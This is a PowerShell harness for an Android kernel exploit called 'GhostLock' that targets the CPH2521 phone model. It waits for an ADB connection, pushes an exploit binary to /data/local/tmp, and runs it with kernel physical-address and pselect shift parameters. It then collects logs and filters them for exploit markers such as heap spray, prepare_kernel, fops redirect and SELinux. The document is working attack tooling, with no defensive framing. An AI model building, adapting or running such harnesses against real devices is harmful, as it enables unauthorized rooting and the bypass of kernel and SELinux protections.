# Reliable ADB attach watcher for CPH2521 GhostLock
# Polls adb; after OfflineGraceSec announces NEED_REPLUG; on healthy attach
# pushes binary and runs exploit within RunWithinSec; collects logs.
#
# Usage:
#   .\adb_watch_and_run.ps1
#   .\adb_watch_and_run.ps1 -RebootFirst
#   .\adb_watch_and_run.ps1 -WatchOnly
#   .\adb_watch_and_run.ps1 -Kphys 0xa8000000 -Shift -2

param(
  [string]$Kphys = "0xa8000000",
  [string]$Shift = "",
  [int]$PollMs = 1000,
  [int]$OfflineGraceSec = 20,
  [int]$RunWithinSec = 30,
  [int]$ExploitTimeoutSec = 55,
  [int]$MaxWaitSec = 600,
  [switch]$RebootFirst,
  [switch]$WatchOnly,
  [switch]$BeepOnReplug,
  [string]$LogDir = "C:\Users\LENOVO\AppData\Local\Temp\grok-cph2521-quest"
)

$ErrorActionPreference = "Continue"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$Bin = Join-Path $Root "ghostlock-cph2521"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
$stamp = Get-Date -Format "yyyyMMdd_HHmmss"
$meta = Join-Path $LogDir ("watch_{0}_meta.txt" -f $stamp)
$runLog = Join-Path $LogDir ("watch_{0}_run.log" -f $stamp)
$plain = Join-Path $LogDir ("watch_{0}_run_plain.log" -f $stamp)
$statusFile = Join-Path $LogDir "watch_status.txt"

function Stamp([string]$msg, [string]$level = "INFO") {
  $line = "[{0}] [{1}] {2}" -f (Get-Date -Format "HH:mm:ss.fff"), $level, $msg
  Write-Host $line
  Add-Content -Path $meta -Value $line
  Set-Content -Path $statusFile -Value $line -Encoding utf8
}

function Get-AdbDeviceLines {
  # Never kill-server — only query
  return (cmd /c "adb devices 2>nul" | Out-String)
}

function Test-DeviceHealthy {
  $devs = Get-AdbDeviceLines
  if ($devs -notmatch "\tdevice(\s|$)") { return $false }
  $r = cmd /c "adb shell echo HEALTH_OK 2>nul" | Out-String
  return ($r -match "HEALTH_OK")
}

function Get-ShellSnapshot {
  return (cmd /c "adb shell echo SNAP; adb shell uname -r; adb shell cat /proc/uptime; adb shell getenforce; adb shell ls -la /data/local/tmp/a/e 2>nul" | Out-String)
}

function Ensure-Binary {
  if (-not (Test-Path $Bin)) {
    Stamp "MISSING binary: $Bin" "ERROR"
    return $false
  }
  # Never use adb kill-server. Capture stderr without treating it as terminating.
  cmd /c "adb shell mkdir -p /data/local/tmp/a" 2>$null | Out-Null
  $push = cmd /c "adb push `"$Bin`" /data/local/tmp/a/e" 2>&1 | Out-String
  Stamp ("push: " + ($push -replace '\s+', ' ').Trim())
  cmd /c "adb shell chmod 755 /data/local/tmp/a/e" 2>$null | Out-Null
  $chk = cmd /c "adb shell test -x /data/local/tmp/a/e && echo BIN_OK || echo BIN_FAIL" 2>&1 | Out-String
  Stamp ("bin check: " + $chk.Trim())
  return ($chk -match "BIN_OK")
}

function Invoke-Exploit {
  param([datetime]$AttachTime)

  $envParts = @("KPHYS=$Kphys")
  if ($Shift -ne "") { $envParts += "PSELECT_SHIFT=$Shift" }
  $envLine = $envParts -join " "
  $deadline = $AttachTime.AddSeconds($RunWithinSec)
  $left = [int]($deadline - (Get-Date)).TotalMilliseconds
  Stamp "launch window remaining ms=$left env=$envLine"

  $runT0 = Get-Date
  Stamp "LAUNCH exploit timeout=${ExploitTimeoutSec}s"
  $shellCmd = "export $envLine; /data/local/tmp/a/e; echo EXIT_CODE:`$?"

  $job = Start-Job -ScriptBlock {
    param($c)
    & adb shell $c 2>&1
  } -ArgumentList $shellCmd

  $done = Wait-Job $job -Timeout $ExploitTimeoutSec
  if ($done) {
    $out = Receive-Job $job
  } else {
    Stamp "host timeout - killing job / device e" "WARN"
    Stop-Job $job -ErrorAction SilentlyContinue
    $out = Receive-Job $job -ErrorAction SilentlyContinue
    try { & adb shell "killall -9 e 2>/dev/null" 2>$null } catch {}
  }
  Remove-Job $job -Force -ErrorAction SilentlyContinue

  $out | ForEach-Object {
    $s = "$_"
    Write-Host $s
    Add-Content -Path $runLog -Value $s
  }

  $runT1 = Get-Date
  Stamp ("exploit finished after {0}s (attach-to-launch {1}s)" -f `
    [int]($runT1 - $runT0).TotalSeconds, `
    [int]($runT0 - $AttachTime).TotalSeconds)

  $raw = Get-Content $runLog -Raw -ErrorAction SilentlyContinue
  if ($raw) {
    $p = [regex]::Replace($raw, '\x1b\[[0-9;]*m', '')
    Set-Content -Path $plain -Value $p -Encoding utf8
    Stamp "=== KEY LINES ==="
    $p -split "`r?`n" | Where-Object {
      $_ -match 'offsets matched|prepare_kernel|KernelSnitch|heap spray|pselect|cfi |ioctl=|fops redirect|Write 1|SELinux|EXIT|errno|success'
    } | ForEach-Object { Stamp "KEY: $_" }
  }
}

# --- main ---
"" | Set-Content $meta -Encoding utf8
"" | Set-Content $runLog -Encoding utf8
Stamp "watcher start LogDir=$LogDir"
Stamp "binary=$Bin exists=$(Test-Path $Bin)"
Stamp "poll=${PollMs}ms offlineGrace=${OfflineGraceSec}s runWithin=${RunWithinSec}s"

# Do not kill-server here (often hangs on Windows). Ensure server is up.
try { & adb start-server 2>&1 | Out-Null } catch {}

if ($RebootFirst) {
  if (Test-DeviceHealthy) {
    Stamp "RebootFirst: pushing binary then adb reboot"
    Ensure-Binary | Out-Null
    Stamp "adb reboot..."
    & adb reboot 2>&1 | ForEach-Object { Stamp "$_" }
  } else {
    Stamp "RebootFirst requested but no healthy device - will wait for attach" "WARN"
  }
}

$t0 = Get-Date
$lastSeenHealthy = $null
$offlineSince = Get-Date
$replugAnnounced = $false
$ranExploit = $false

Stamp "entering watch loop (MaxWaitSec=$MaxWaitSec)..."
Stamp "If offline > ${OfflineGraceSec}s you will see NEED_REPLUG"

while (((Get-Date) - $t0).TotalSeconds -lt $MaxWaitSec) {
  $healthy = Test-DeviceHealthy
  $devs = (Get-AdbDeviceLines).Trim() -replace '\s+', ' '

  if ($healthy) {
    if (-not $lastSeenHealthy) {
      $attachTime = Get-Date
      $offlineSince = $null
      $replugAnnounced = $false
      Stamp "DEVICE HEALTHY ATTACH" "OK"
      Stamp ("snapshot: " + (Get-ShellSnapshot).Trim())

      if (-not $WatchOnly -and -not $ranExploit) {
        if (-not (Ensure-Binary)) {
          Stamp "binary push failed - will retry next poll" "ERROR"
          Start-Sleep -Milliseconds $PollMs
          continue
        }
        Invoke-Exploit -AttachTime $attachTime
        $ranExploit = $true
        Stamp "exploit cycle complete - watching post-run state"
      }
    }
    $lastSeenHealthy = Get-Date
  } else {
    if (-not $offlineSince) { $offlineSince = Get-Date }
    $offSec = [int]((Get-Date) - $offlineSince).TotalSeconds

    if ($offSec -ge $OfflineGraceSec) {
      if (-not $replugAnnounced) {
        $replugAnnounced = $true
        Stamp "========================================" "REPLUG"
        Stamp "ADB OFFLINE for ${offSec}s" "REPLUG"
        Stamp ">>> NEED_REPLUG: unplug USB, wait 2s, replug, unlock phone, allow USB debugging <<<" "REPLUG"
        Stamp "========================================" "REPLUG"
        if ($BeepOnReplug) {
          try {
            [console]::Beep(880, 200)
            [console]::Beep(660, 200)
            [console]::Beep(880, 400)
          } catch {}
        }
      } elseif (($offSec % 30) -lt 2) {
        Stamp "still offline ${offSec}s - NEED_REPLUG if cable connected ($devs)" "REPLUG"
      }
    } elseif (($offSec % 10) -eq 0) {
      Stamp "offline ${offSec}s (grace ${OfflineGraceSec}s) adb=[$devs]"
    }
  }

  if ($ranExploit -and -not $WatchOnly) {
    Start-Sleep 3
    if (Test-DeviceHealthy) {
      Stamp ("post-run online: " + (Get-ShellSnapshot).Trim())
      try { & adb shell "killall -9 e 2>/dev/null" 2>$null } catch {}
      Stamp "DONE logs meta=$meta run=$runLog plain=$plain"
      break
    }
    $postWait = 0
    while ($postWait -lt 120 -and -not (Test-DeviceHealthy)) {
      Start-Sleep 3
      $postWait += 3
      if (($postWait % 15) -eq 0) {
        Stamp "post-run wait ${postWait}s for device..."
        if ($postWait -ge 45 -and -not $replugAnnounced) {
          $replugAnnounced = $true
          Stamp ">>> NEED_REPLUG after exploit (ADB still down) <<<" "REPLUG"
          if ($BeepOnReplug) {
            try { [console]::Beep(880, 300) } catch {}
          }
        }
      }
    }
    if (Test-DeviceHealthy) {
      Stamp ("device returned: " + (Get-ShellSnapshot).Trim())
      try { & adb shell "killall -9 e 2>/dev/null" 2>$null } catch {}
    } else {
      Stamp "device did not return within 120s - NEED_REPLUG" "REPLUG"
    }
    Stamp "DONE logs meta=$meta run=$runLog plain=$plain"
    break
  }

  Start-Sleep -Milliseconds $PollMs
}

if (-not $ranExploit -and -not $WatchOnly) {
  Stamp "TIMEOUT waiting for device / no exploit run" "ERROR"
  Stamp "NEED_REPLUG: unplug/replug USB, unlock, allow debugging" "REPLUG"
  exit 2
}

Stamp "watcher exit"
Write-Host ""
Write-Host "Status file: $statusFile"
Write-Host "Meta:        $meta"
Write-Host "Run log:     $runLog"
Write-Host "Plain log:   $plain"
